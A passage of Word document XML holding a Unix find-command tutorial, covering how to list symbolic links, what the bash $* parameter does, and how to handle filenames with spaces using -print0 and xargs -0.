      <w:hyperlink r:id="rId54" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:i/>
            <w:iCs/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>symbolic links</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in your home directory</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>, and print the files your symbolic links points to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF08B92" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>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66"/>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-type</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> l </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-print</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">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66"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xargs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>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66"/>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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>ld</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">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66"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>awk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>'{print $10}'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56276662"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The "." says starts from current directory and include all subdirectory and  "-type l" says list all links.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408FB1AA"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Hope you find this useful, please share how you are using find commands and we can benefit from each other's experience and work more efficiently in UNIX.</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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Tip: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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>$*</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> :    $* is o</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">ne of the </w:t>
      </w:r>
      <w:hyperlink r:id="rId55" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t xml:space="preserve">special bash parameters </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>which is used to expands positional parameters from position one. if you give double quotes and expansion is done within double quotes, it only expands to a single word and corresponding value of each parameter will be separated by the first letter of the IFS environment variable defined in bash.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Here is a nice comic from Julia Evans to remember some of the most useful find command examples, which will help you to get more from this excellent command line tool in UNIX and Linux:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639FAE75" w14:textId="7D8A2748" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>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noProof/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="437AD298" wp14:editId="3E026930">
            <wp:extent cx="5943600" cy="3826510"/>
            <wp:effectExtent l="0" t="0" r="0" b="2540"/>
            <wp:docPr id="32" name="Picture 32" descr="10 Example of find command in Unix and Linux">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0 Example of find command in Unix and Linux">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14:paraId="7FF4A753"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Do let me know how do you find these find examples.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C41FC6" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A03DC3F" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>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t>How to use find command on filenames with space in UNIX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31255D9D"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 xml:space="preserve">I have received a lot of comments from my readers on not mentioning about </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find -print0</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xargs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0 on find examples</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, so I thought to include this as well. When we don't specify any expression after find command the default option is -print which prints the name of each found files followed by \n or </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>newline</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.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 xml:space="preserve">Since we mostly </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">pipe the output of find command to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>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-print could cause a problem if file name itself contains a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>new line or any form of white space</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">. To resolve this issue </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>instead of -print use -print0</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>.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 xml:space="preserve">The difference between </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">find -print </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find -print0</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> is, print0 display file name on the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> followed by a "NUL" character and then you can </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xargs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> commands to process file names with a null character. </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lastRenderedPageBreak/>
        <w:br/>
        <w:t>let's see UNIX find command example with a file name having space in them:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01852C20"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javin</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testenv1:~</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b/>
          <w:bCs/>
          <w:color w:val="7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>test</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-name</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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"*equity*"</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-print</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:br/>
        <w:t>.</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cash equity trading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equity~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFA842A"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 xml:space="preserve">You see here "cash equity trading" has space in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>there</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AD3678"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javin</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testenv1:~</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b/>
          <w:bCs/>
          <w:color w:val="7A0874"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>test</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-name</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FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"*equity*"</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-print</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>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-l</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00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>: cannot access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cash: No such </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or directory</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00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">: cannot access equity: No such </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or directory</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00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">: cannot access trading: No such </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> or directory</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660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-r--</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
